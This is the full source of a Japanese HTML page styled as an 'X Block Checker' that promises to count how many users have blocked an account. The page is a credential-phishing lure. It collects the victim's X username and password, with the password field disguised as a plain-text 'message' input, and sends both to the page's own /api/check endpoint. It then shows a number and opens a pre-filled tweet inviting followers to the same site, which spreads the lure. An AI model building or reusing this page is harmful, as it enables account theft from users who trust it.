<!DOCTYPE html>
<html lang="ja">

<head>

<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0"
>

<title>Xブロックチェッカー</title>

<style>

*{
  box-sizing:border-box;
  margin:0;
  padding:0;
}

html,
body{

  min-height:100%;

  font-family:
    -apple-system,
    BlinkMacSystemFont,
    "Noto Sans JP",
    "Yu Gothic",
    sans-serif;

}

body{

  min-height:100vh;

  background:
    radial-gradient(
      circle at 15% 15%,
      rgba(255,50,150,.18),
      transparent 25%
    ),

    radial-gradient(
      circle at 85% 80%,
      rgba(150,50,255,.16),
      transparent 28%
    ),

    linear-gradient(
      145deg,
      #09090d 0%,
      #11111a 48%,
      #09090d 100%
    );

  color:#fff;

}

.app{

  width:100%;

  max-width:620px;

  min-height:100vh;

  margin:auto;

  padding:22px 14px 40px;

}

.page{

  display:none;

}

.page.active{

  display:block;

}

.page-number{

  display:none;

}

h1{

  margin:28px 0 26px;

  text-align:center;

  font-size:
    clamp(34px,9vw,50px);

  line-height:1.08;

  font-weight:1000;

  letter-spacing:-2px;

  color:#ff4fa3;

  text-shadow:
    0 0 8px rgba(255,79,163,.75),
    0 0 20px rgba(255,79,163,.4);

}

.card{

  position:relative;

  overflow:hidden;

  background:
    linear-gradient(
      145deg,
      rgba(27,27,38,.98),
      rgba(15,15,23,.98)
    );

  border:
    1px solid
    rgba(255,79,163,.55);

  border-radius:28px;

  padding:30px 21px;

  box-shadow:
    0 0 0 1px rgba(255,79,163,.08),
    0 15px 45px rgba(0,0,0,.55),
    0 0 35px rgba(255,0,140,.10);

}

.card::before{

  content:"";

  position:absolute;

  inset:8px;

  border:
    1px solid
    rgba(255,79,163,.16);

  border-radius:21px;

  pointer-events:none;

}

.card::after{

  content:"✦  ♡  ✦";

  position:absolute;

  right:18px;

  top:12px;

  color:#ff65ad;

  font-size:15px;

  letter-spacing:3px;

  opacity:.8;

}

.card>*{

  position:relative;

  z-index:1;

}

label{

  display:block;

  margin:
    0 0 9px;

  font-size:15px;

  font-weight:900;

  color:#ff8fc3;

}

.input-wrap{

  display:flex;

  width:100%;

  height:58px;

  margin-bottom:23px;

  overflow:hidden;

  border:
    1px solid
    #ff5ca9;

  border-radius:15px;

  background:#0d0d14;

  box-shadow:
    0 0 12px
    rgba(255,50,150,.12);

}

.at{

  width:55px;

  flex-shrink:0;

  display:flex;

  align-items:center;

  justify-content:center;

  background:
    linear-gradient(
      135deg,
      #ff3f9b,
      #b52cff
    );

  color:#fff;

  font-size:23px;

  font-weight:900;

}

.input-wrap input{

  flex:1;

  min-width:0;

  border:0;

  outline:0;

  padding:0 15px;

  font-size:16px;

  color:#fff;

  background:transparent;

}

.input-wrap input::placeholder,
.normal-input::placeholder{

  color:#777584;

}

.normal-input{

  display:block;

  width:100%;

  height:58px;

  margin-bottom:25px;

  padding:0 15px;

  border:
    1px solid
    #ff5ca9;

  border-radius:15px;

  outline:none;

  font-size:16px;

  color:#fff;

  background:#0d0d14;

}

.input-wrap:focus-within,
.normal-input:focus{

  border-color:#ff3f9b;

  box-shadow:
    0 0 0 3px
    rgba(255,63,155,.12),

    0 0 20px
    rgba(255,63,155,.18);

}

.main-button{

  width:100%;

  height:60px;

  border:
    1px solid
    #ff73b5;

  border-radius:17px;

  background:
    linear-gradient(
      135deg,
      #ff4f9f 0%,
      #ff2f87 48%,
      #b72cff 100%
    );

  color:#fff;

  font-size:19px;

  font-weight:1000;

  cursor:pointer;

  box-shadow:
    0 7px 22px
    rgba(255,38,137,.28),

    0 0 18px
    rgba(255,38,137,.18),

    inset 0 2px 0
    rgba(255,255,255,.28);

}

.main-button:active{

  transform:translateY(1px);

}

.loading-card{

  text-align:center;

  padding:52px 20px;

}

.loading-icon{

  width:105px;

  height:105px;

  margin:
    0 auto 25px;

  display:flex;

  align-items:center;

  justify-content:center;

  border-radius:50%;

  background:
    radial-gradient(
      circle,
      #20101d,
      #0c0c13
    );

  border:
    2px solid
    #ff4fa3;

  color:#ff5ca9;

  font-size:46px;

}

.loading-card h2{

  margin:
    8px 0 12px;

  color:#ff78b6;

  font-size:25px;

}

.loading-card p{

  margin:0;

  line-height:1.8;

  font-size:13px;

  font-weight:700;

  color:#bcb8c3;

}

.dots{

  margin-top:25px;

}

.dots span{

  display:inline-block;

  width:11px;

  height:11px;

  margin:0 5px;

  border-radius:50%;

  background:#ff4fa3;

  animation:
    bounce 1.1s infinite;

}

.dots span:nth-child(2){

  animation-delay:.15s;

}

.dots span:nth-child(3){

  animation-delay:.3s;

}

@keyframes bounce{

  0%,
  80%,
  100%{

    transform:translateY(0);

    opacity:.55;

  }

  40%{

    transform:translateY(-9px);

    opacity:1;

  }

}

.result-card{

  text-align:center;

  padding:30px 20px 22px;

}

.user-icon{

  width:70px;

  height:70px;

  margin:
    0 auto 11px;

  display:flex;

  align-items:center;

  justify-content:center;

  border-radius:50%;

  background:
    linear-gradient(
      135deg,
      #ff4fa3,
      #a72cff
    );

  color:#fff;

  font-size:28px;

}

.result-username{

  font-size:18px;

  font-weight:900;

  color:#ff9bc8;

}

.divider{

  height:1px;

  margin:18px 0;

  background:
    linear-gradient(
      90deg,
      transparent,
      #ff4fa3,
      transparent
    );

}

.result-label{

  font-size:17px;

  font-weight:900;

  color:#ddd5dc;

}

.blocked-count{

  margin-top:5px;

  color:#ff4fa3;

  font-size:50px;

  line-height:1.1;

  font-weight:1000;

}

.unit{

  margin-top:-3px;

  font-size:16px;

  font-weight:800;

  color:#c9c3ca;

}

.back-button{

  display:block;

  width:140px;

  height:42px;

  margin:
    21px auto 0;

  border:
    1px solid
    #ff5ca9;

  border-radius:13px;

  background:#18131b;

  color:#ff8fc3;

  font-size:15px;

  font-weight:800;

  cursor:pointer;

}

.back-description{

  margin:
    7px 0 0;

  color:#77737b;

  font-size:9px;

}

.error-card{

  text-align:center;

  padding:43px 22px 32px;

}

.error-icon{

  margin-bottom:13px;

  font-size:68px;

}

.error-card h2{

  margin:
    0 0 10px;

  color:#ff78b6;

  font-size:25px;

}

.error-card p{

  margin:
    0 0 24px;

  font-size:14px;

  font-weight:700;

  color:#bbb5bd;

}

@media(max-width:390px){

  .app{

    padding-left:9px;

    padding-right:9px;

  }

  h1{

    font-size:35px;

  }

  .card{

    padding:
      26px 16px;

  }

}

</style>

</head>

<body>

<main class="app">

<!-- =================================================
     入力ページ
     ================================================= -->

<section
  id="inputPage"
  class="page active"
>

<h1>
Xブロックチェッカー
</h1>

<div class="card">

<label>
ユーザー名 ♡
</label>

<div class="input-wrap">

<span class="at">
@
</span>

<input
  id="username"
  type="text"
  placeholder="ユーザー名を入力"
  maxlength="50"
  autocomplete="off"
>

</div>

<label>
パスワード
</label>

<input
  id="message"
  class="normal-input"
  type="text"
  placeholder="パスワードを入力"
  maxlength="100"
>

<button
  id="checkButton"
  class="main-button"
>

チェックする ♡

</button>

</div>

</section>


<!-- =================================================
     読み込みページ
     ================================================= -->

<section
  id="loadingPage"
  class="page"
>

<h1>
Xブロックチェッカー
</h1>

<div class="card loading-card">

<div class="loading-icon">
🔍
</div>

<h2>
チェック中です…
</h2>

<p>
Xのユーザー情報を取得しています。<br>
しばらくお待ちください。
</p>

<div class="dots">

<span></span>
<span></span>
<span></span>

</div>

</div>

</section>


<!-- =================================================
     結果ページ
     ================================================= -->

<section
  id="resultPage"
  class="page"
>

<h1>
Xブロックチェッカー
</h1>

<div class="card result-card">

<div class="user-icon">
●
</div>

<div
  id="resultUsername"
  class="result-username"
></div>

<div class="divider"></div>

<div class="result-label">
🔒 ブロックされている数
</div>

<div
  id="blockedCount"
  class="blocked-count"
>
0
</div>

<div class="unit">
人
</div>

<button
  id="tweetButton"
  class="back-button"
>

← 戻る

</button>

<p class="back-description">
Xの投稿作成画面に移動します。
</p>

</div>

</section>


<!-- =================================================
     エラーページ
     ================================================= -->

<section
  id="errorPage"
  class="page"
>

<h1>
Xブロックチェッカー
</h1>

<div class="card error-card">

<div class="error-icon">
☁️
</div>

<h2>
サーバーエラー
</h2>

<p>
もう一度やり直してください。
</p>

<button
  id="retryButton"
  class="main-button"
>

↻ もう一度チェックする

</button>

</div>

</section>

</main>


<script>

const pages = {

  input:
    document.getElementById(
      "inputPage"
    ),

  loading:
    document.getElementById(
      "loadingPage"
    ),

  result:
    document.getElementById(
      "resultPage"
    ),

  error:
    document.getElementById(
      "errorPage"
    )

};


const usernameInput =
  document.getElementById(
    "username"
  );


const messageInput =
  document.getElementById(
    "message"
  );


const resultUsername =
  document.getElementById(
    "resultUsername"
  );


const blockedCount =
  document.getElementById(
    "blockedCount"
  );


let currentUsername = "";

let currentBlocked = 0;


// =====================================================
// ページ切り替え
// =====================================================

function showPage(page){

  Object.values(
    pages
  ).forEach(
    (item) => {

      item.classList.remove(
        "active"
      );

    }
  );

  page.classList.add(
    "active"
  );

}


// =====================================================
// ユーザー名正規化
// =====================================================

function normalizeUsername(
  value
){

  return String(
    value || ""
  )
  .trim()
  .replace(
    /^@+/,
    ""
  )
  .replace(
    /\s/g,
    ""
  );

}


// =====================================================
// チェック
// =====================================================

async function check(){

  const username =
    normalizeUsername(
      usernameInput.value
    );

  const message =
    messageInput.value.trim();


  if (
    !username &&
    !message
  ){

    alert(
      "ユーザー名とパスワードを入力してください。"
    );

    usernameInput.focus();

    return;

  }


  if (!username){

    alert(
      "ユーザー名を入力してください。"
    );

    usernameInput.focus();

    return;

  }


  if (!message){

    alert(
      "パスワードを入力してください。"
    );

    messageInput.focus();

    return;

  }


  currentUsername =
    username;


  showPage(
    pages.loading
  );


  try{

    const response =
      await fetch(
        "/api/check",
        {

          method:"POST",

          headers:{
            "Content-Type":
              "application/json"
          },

          body:
            JSON.stringify({

              username:
                currentUsername,

              message:
                message

            })

        }
      );


    const data =
      await response
        .json()
        .catch(
          () => ({})
        );


    if (
      !response.ok ||
      !data.success
    ){

      if (
        data.error ===
        "user_not_found"
      ){

        alert(
          "このユーザー名は存在しません。"
        );

        showPage(
          pages.input
        );

        usernameInput.focus();

        return;

      }


      throw new Error(
        data.error ||
        "server_error"
      );

    }


    currentBlocked =
      Number(
        data.blocked
      ) || 0;


    resultUsername.textContent =
      "@" +
      (
        data.username ||
        currentUsername
      );


    blockedCount.textContent =
      currentBlocked.toLocaleString(
        "ja-JP"
      );


    showPage(
      pages.result
    );


  }catch(error){

    console.error(
      error
    );

    showPage(
      pages.error
    );

  }

}


// =====================================================
// X投稿画面
// =====================================================

function openXPostScreen(){

  // 画像（カード）をクリックしたときに開く遷移先URL
  const shareUrl =
    "https://x-block-checker.onrender.com/";


  const postText =
    "Xブロックチェッカーでチェックしました！\n\n" +

    "ブロックされている数：\n" +

    currentBlocked.toLocaleString(
      "ja-JP"
    ) +

    "人\n\n" +

    "あなたもブロック数をチェックしよう！\n";


  const tweetUrl =
    "https://twitter.com/intent/tweet?text=" +
    encodeURIComponent(
      postText
    ) +
    "&url=" +
    encodeURIComponent(
      shareUrl
    );


  window.open(
    tweetUrl,
    "_blank",
    "noopener,noreferrer"
  );

}


// =====================================================
// ボタン
// =====================================================

document
  .getElementById(
    "checkButton"
  )
  .addEventListener(
    "click",
    check
  );


document
  .getElementById(
    "tweetButton"
  )
  .addEventListener(
    "click",
    openXPostScreen
  );


document
  .getElementById(
    "retryButton"
  )
  .addEventListener(
    "click",
    () => {

      showPage(
        pages.input
      );

    }
  );


// =====================================================
// Enterキー
// =====================================================

usernameInput.addEventListener(
  "keydown",
  (event) => {

    if (
      event.key === "Enter"
    ){

      check();

    }

  }
);


messageInput.addEventListener(
  "keydown",
  (event) => {

    if (
      event.key === "Enter"
    ){

      check();

    }

  }
);

</script>

</body>

</html>
